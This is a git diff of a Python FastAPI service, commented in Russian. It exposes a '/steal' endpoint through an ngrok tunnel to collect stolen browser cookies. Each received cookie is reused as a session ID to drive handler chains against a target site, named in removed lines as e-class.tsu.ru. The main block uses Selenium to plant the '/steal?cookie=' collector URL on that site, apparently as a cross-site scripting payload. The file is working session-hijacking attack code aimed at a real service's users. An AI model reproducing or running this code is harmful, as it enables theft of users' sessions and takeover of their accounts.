@@ -1,26 +1,17 @@
 from fastapi import FastAPI, HTTPException, Request
 import uvicorn
 from pyngrok import ngrok, conf
-from config import TARGET_URL, get_base_headers
-from models import ExecuteRequestData, ExecuteResponseData
-from context import RequestContext
-from handlers import (
-    SetupRequestHandler,
-    PayloadHandler,
-    ExecutionHandler,
-    LoggingHandler,
-)
-from exceptions import ChainException
+import threading  # Для запуска uvicorn и управления завершением программы
+
+# from exceptions import ChainException
 from selenium_start_point import run_capture_logic, close_driver
+from requests_to_selenium import rename, message
 
-app = FastAPI(
-    title="Chain of Responsibility Service",
-    description="Executes requests to e-class.tsu.ru using Chain of Responsibility pattern.",
-    version="1.0.0",
-)
-
+app = FastAPI()
 
 NGROK_PUBLIC_URL = None
+
+stop_event = threading.Event()
 
 
 def start_ngrok():
@@ -39,74 +30,81 @@ def shutdown_ngrok():
     print("Ngrok tunnel shutdown")
 
 
-@app.get("/steal")
+# @app.options("/steal")
+# async def options_steal():
+#     return {
+#         "Allow": "OPTIONS, GET",
+#         "Content-Length": "0",
+#         "Content-Type": "text/plain",
+#     }
+
+
+@app.options("/steal")
 async def steal_cookie(request: Request):
     cookie = request.query_params.get("cookie", "No cookie received")
     print(f"Received stolen cookie: {cookie}")
-    return {"message": "Cookie received", "cookie": cookie}
 
+    # Создаем контекст запроса
+    from context import RequestContext
+    from config import TARGET_URL, get_base_headers
 
-@app.post(
-    "/execute-chain", response_model=ExecuteResponseData, tags=["Chain Execution"]
-)
-async def execute_chain_endpoint(request_data: ExecuteRequestData):
-    print(f"\n--- Received API request for session_id: {request_data.session_id} ---")
-
-    if not NGROK_PUBLIC_URL:
-        raise HTTPException(status_code=500, detail="Ngrok tunnel not initialized")
-
-    request_context = RequestContext(
+    context = RequestContext(
         url=TARGET_URL,
         base_headers=get_base_headers(),
-        session_id=request_data.session_id,
-        callback_url=NGROK_PUBLIC_URL,
+        session_id=cookie,
     )
 
-    logging_handler = LoggingHandler()
-    setup_handler = SetupRequestHandler()
-    payload_handler = PayloadHandler()
-    execution_handler = ExecutionHandler()
-
-    logging_handler.set_next(setup_handler).set_next(payload_handler).set_next(
-        execution_handler
-    )
+    # Создаем цепочку обязанностей
+    from handlers import AdminTokenHandler, UserChatHandler, LoggingHandler
 
     try:
-        print("--- Starting chain of handlers ---")
-        final_context = logging_handler.handle_request(request_context)
-        print("--- Chain execution completed ---")
+        admin_handler = AdminTokenHandler()
+        user_chat_handler = UserChatHandler()
+        logging_handler = LoggingHandler()
 
-        if final_context.response:
-            response_text = final_context.response.text
-            return ExecuteResponseData(
-                success=True,
-                message="Request successfully sent to target server.",
-                target_status_code=final_context.response.status_code,
-                target_response_preview=(
-                    response_text[:100] + "..." if response_text else None
-                ),
-            )
-        else:
-            return ExecuteResponseData(
-                success=False,
-                message="Chain completed, but no response from target server.",
-                target_status_code=None,
-            )
+        # Устанавливаем последовательность цепочки
+        admin_handler.set_next(user_chat_handler).set_next(logging_handler)
 
-    except ChainException as e:
-        raise HTTPException(status_code=500, detail=f"Chain error: {e.message}")
+        # Запускаем обработку запроса через цепочку
+        admin_handler.handle_request(context)
+
+        return {
+            "message": "Request processed through Chain of Responsibility",
+            "cookie": cookie,
+        }
+
+    except Exception as e:
+        return {"error": f"Unexpected error: {str(e)}"}
+
+
+def start_server():
+    uvicorn.run(app, host="127.0.0.1", port=8000)
 
 
 if __name__ == "__main__":
     try:
-
         start_ngrok()
         print("--- Starting FastAPI server ---")
         print("Visit http://127.0.0.1:8000/docs for API documentation")
-        uvicorn.run(app, host="127.0.0.1", port=8000)
+
+        # Запуск uvicorn в отдельном потоке
+        server_thread = threading.Thread(target=start_server, daemon=True)
+        server_thread.start()
+
+        # Выполнение основного скрипта
         driver = run_capture_logic()
+        rename(NGROK_PUBLIC_URL + "/steal?" + "cookie=")
+        message()
+
+        # Ожидание завершения программы
+        print("Основной скрипт завершен. Сервер продолжает работу.")
+        stop_event.wait()  # Блокировка основного потока до установки события
+
+    except KeyboardInterrupt:
+        print("Завершение работы по сигналу KeyboardInterrupt.")
+        print("Завершение работы по сигналу KeyboardInterrupt.")
 
     finally:
-
         shutdown_ngrok()
         close_driver(driver)
+        stop_event.set()  # Установка события для завершения программы
